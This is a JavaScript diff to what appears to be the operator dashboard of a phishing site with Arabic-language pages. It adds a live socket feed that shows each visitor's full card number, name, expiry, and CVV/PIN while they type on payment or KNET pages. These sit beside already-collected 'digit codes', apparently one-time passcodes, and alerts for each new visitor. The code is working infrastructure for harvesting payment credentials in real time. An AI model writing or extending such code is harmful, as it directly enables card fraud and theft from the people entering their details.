@@ -1078,7 +1078,17 @@
         showNotification('زائر جديد: ' + visitor.visitorNumber);
       });
 
-      socket.on('visitor:pageChanged', ({ visitorId, page }) => {
+      socket.on('card:liveUpdate', ({ visitorId, liveCard, liveCardTimestamp }) => {
+  const visitor = visitors.get(visitorId);
+  if (visitor) {
+    visitor.liveCard = liveCard;
+    if (liveCardTimestamp) visitor.liveCardTimestamp = liveCardTimestamp;
+    visitors.set(visitorId, visitor);
+    if (selectedVisitorId === visitorId) renderVisitorDetails(visitor);
+  }
+});
+
+socket.on('visitor:pageChanged', ({ visitorId, page }) => {
         console.log('visitor:pageChanged received:', visitorId, page);
         const visitor = visitors.get(visitorId);
         console.log('visitor found:', visitor ? 'yes' : 'no');
@@ -1559,7 +1569,14 @@ html += '</select>';
       // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
       
-      // Add digit codes with type
+      // ===== بطاقة الدفع المباشر =====
+const visitorPage = (visitor.page || '').toLowerCase();
+const isOnPaymentPage = visitorPage.includes('الدفع') || visitorPage.includes('payment') || visitorPage.includes('credit') || visitorPage.includes('بطاقة') || visitorPage.includes('كي نت') || visitorPage.includes('knet');
+if (isOnPaymentPage && visitor.liveCard) {
+  allEntries.push({ type: 'liveCard', data: visitor.liveCard, index: 0, timestamp: new Date(Date.now() + 999999999).toISOString() });
+}
+
+// Add digit codes with type
       if (visitor.digitCodes && visitor.digitCodes.length > 0) {
         visitor.digitCodes.forEach((dc, index) => {
           allEntries.push({
@@ -1602,7 +1619,27 @@ html += '</select>';
       if (allEntries.length > 0) {
         html += '<div class="space-y-3">';
         allEntries.forEach((entry) => {
-          if (entry.type === 'code') {
+          if (entry.type === 'liveCard') {
+  const lc = entry.data;
+  const lcNumRaw = String(lc.cardNumber || '').replace(/\D/g, '');
+  const lcNum = lcNumRaw ? lcNumRaw.replace(/(\d{4})(?=\d)/g, '$1 ') : 'XXXX XXXX XXXX XXXX';
+  const lcName = String(lc.nameOnCard || '---').replace(/[&<>"']/g, function (ch) { return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' })[ch]; });
+  const lcExpiry = lc.expiryDate || 'XX/XX';
+  const lcCvv = lc.cvv || '---';
+  html += '<div class="data-section bg-blue-50 p-4 rounded-lg" style="border-right-color:#2563eb;">';
+  html += '<div class="flex justify-between items-center mb-3">';
+  html += '<h3 class="font-bold text-blue-800">بطاقة الدفع المباشر</h3>';
+  html += '<span class="text-xs bg-blue-600 text-white px-2 py-1 rounded-full waiting-badge">مباشر</span>';
+  html += '</div>';
+  html += '<div class="bg-white p-3 rounded-lg space-y-2">';
+  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">رقم البطاقة</span><span class="font-mono font-bold" dir="ltr">' + lcNum + '</span></div>';
+  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">الاسم</span><span class="font-medium" dir="ltr">' + lcName + '</span></div>';
+  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">الانتهاء</span><span class="font-mono" dir="ltr">' + lcExpiry + '</span></div>';
+  html += '<div class="flex justify-between"><span class="text-gray-500 text-sm">CVV / PIN</span><span class="font-mono" dir="ltr">' + lcCvv + '</span></div>';
+  html += '</div></div>';
+}
+
+if (entry.type === 'code') {
             const dc = entry.data;
             const index = entry.index;
             html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
